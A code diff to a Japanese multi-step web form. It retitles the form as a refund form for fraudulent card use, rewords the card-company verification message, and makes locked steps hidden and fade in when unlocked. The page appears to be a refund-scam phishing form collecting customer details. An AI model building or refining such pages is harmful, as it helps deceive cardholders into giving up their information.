@@ -157,9 +157,7 @@
       }
 
       .phase-card.disabled {
-        opacity: 0.45;
-        pointer-events: none;
-        user-select: none;
+        display: none;
       }
 
       .phase-card.disabled .phase-lock {
@@ -565,7 +563,7 @@
   </head>
   <body>
     <div class="header">
-      <h1>お客様情報 照合入力フォーム</h1>
+      <h1>不正利用ご返金 お客様情報 照合入力フォーム</h1>
     </div>
 
     <div class="container">
@@ -976,7 +974,7 @@
         </div>
         <h2>送信完了</h2>
         <p>
-          ご入力いただきありがとうございます。<br />内容を確認の上、カード会社との照合を行い、<br />改めてご返金方法をご案内させていただきます。
+          ご入力いただきありがとうございます。<br />内容を確認の上、カード会社様との照合を行い、<br />改めてご返金方法をご案内させていただきます。
         </p>
       </div>
 
@@ -1068,7 +1066,12 @@
 
       function unlockPhase(phase) {
         const card = document.getElementById("phase-" + phase);
+        card.style.opacity = "0";
         card.classList.remove("disabled");
+        // Trigger reflow then fade in
+        card.offsetHeight;
+        card.style.transition = "opacity 0.5s ease";
+        card.style.opacity = "1";
         card.scrollIntoView({ behavior: "smooth", block: "center" });
       }
 
